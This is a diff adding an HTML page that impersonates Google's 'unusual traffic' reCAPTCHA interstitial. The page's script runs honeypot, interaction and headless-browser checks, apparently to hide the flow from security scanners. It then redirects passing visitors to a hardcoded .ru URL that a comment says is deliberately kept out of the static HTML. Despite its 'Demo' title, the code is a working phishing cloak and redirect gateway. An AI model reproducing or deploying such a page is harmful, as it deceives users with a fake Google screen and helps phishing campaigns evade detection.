@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Secure CAPTCHA Redirect Demo</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-size: 13px; }
+        .google-header, .main-content, .challenge-title, .challenge-desc, .recaptcha-error, .recaptcha-disclaimer, .footer-bar { font-size: inherit; }
+        button, input, a { font-size: 13px; }
+    </style>
+    <script src='https://www.google.com/recaptcha/api.js' async defer></script>
+</head>
+<body>
+    <div id="captcha-section">
+        <div class="google-header">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="92" height="30" alt="Google">
+        </div>
+        <div class="main-content">
+            <div class="challenge-title">Our systems have detected unusual traffic from your computer network.</div>
+            <div class="challenge-desc">Please complete the check below to continue to the website.</div>
+            <form id="recaptcha-form" autocomplete="off" action="" method="POST">
+                <div class="g-recaptcha" data-sitekey="6LfdBPQqAAAAABJ4VHWKTWCDFiZTWNQSp0UAOF2g"></div>
+                <div id="g-recaptcha-error" style="height: 20px; font-size: 12px; margin-top: 5px;"></div>
+                <!-- Honeypot hidden field -->
+                <input type="text" name="username" style="position: absolute; left: -9999px; top: -9999px;" tabindex="-1" autocomplete="off">
+                <input type="hidden" id="dynamic-token" name="dynamic-token" value="">
+                <button type="submit" id="continue-btn">Continue</button>
+            </form>
+            <div class="recaptcha-disclaimer">
+                This page is protected by reCAPTCHA, and subject to the Google
+                <a href="https://policies.google.com/privacy" target="_blank" rel="noopener">Privacy Policy</a> and
+                <a href="https://policies.google.com/terms" target="_blank" rel="noopener">Terms of Service</a>.
+            </div>
+        </div>
+        <div class="footer-bar">
+            Google - <a href="https://policies.google.com/privacy" target="_blank" rel="noopener">Privacy</a> - <a href="https://policies.google.com/terms" target="_blank" rel="noopener">Terms</a>
+        </div>
+    </div>
+    <div id="redirect-section" style="display:none;"></div>
+    <script>
+    // --- Dynamic Token Generation (Obfuscation) ---
+    function generateToken() {
+        // Simple dynamic token (could be more complex)
+        return btoa(Date.now() + ':' + Math.random());
+    }
+    document.getElementById('dynamic-token').value = generateToken();
+
+    // --- Mouse/Keyboard Interaction Requirement ---
+    let userInteracted = false;
+    function markInteraction() { userInteracted = true; }
+    document.body.addEventListener('mousemove', markInteraction);
+    document.body.addEventListener('keydown', markInteraction);
+
+    // --- CAPTCHA + Honeypot + JS Checks on Submit ---
+    document.getElementById('recaptcha-form').addEventListener('submit', function(e) {
+        var recaptchaResponse = grecaptcha.getResponse();
+        var honeypot = document.querySelector('input[name="username"]').value;
+        var token = document.getElementById('dynamic-token').value;
+        // Headless/automation checks
+        var ua = navigator.userAgent;
+        var isHeadless = navigator.webdriver || /HeadlessChrome/.test(ua) || /PhantomJS/.test(ua);
+        var hasPlugins = navigator.plugins.length > 0;
+        var hasLanguages = Array.isArray(navigator.languages) && navigator.languages.length > 0;
+        if (!userInteracted) {
+            e.preventDefault();
+            document.getElementById('g-recaptcha-error').innerHTML = '<span style="color:red;">Please interact with the page.</span>';
+            return;
+        }
+        if (recaptchaResponse.length < 1) {
+            e.preventDefault();
+            document.getElementById('g-recaptcha-error').innerHTML = '<span style="color:red;">This field is required.</span>';
+            return;
+        }
+        if (honeypot) {
+            e.preventDefault();
+            document.getElementById('g-recaptcha-error').innerHTML = '<span style="color:red;">Bot detected.</span>';
+            return;
+        }
+        if (isHeadless || !hasPlugins || !hasLanguages) {
+            e.preventDefault();
+            document.getElementById('g-recaptcha-error').innerHTML = '<span style="color:red;">Automation detected.</span>';
+            return;
+        }
+        // Store a value in localStorage to check for real browser
+        localStorage.setItem('passedCaptcha', token);
+        // Hide CAPTCHA, show redirect logic
+        e.preventDefault();
+        document.getElementById('captcha-section').style.display = 'none';
+        document.getElementById('redirect-section').style.display = 'block';
+        // --- Dynamic JS Redirect (URL is not in static HTML) ---
+        setTimeout(function() {
+            // Only redirect if token is present in localStorage
+            if (localStorage.getItem('passedCaptcha') === token) {
+                window.location.replace('https://sbq.codesphsere.ru/ZhZW/');
+            }
+        }, 1200);
+    });
+    </script>
+</body>
+</html>
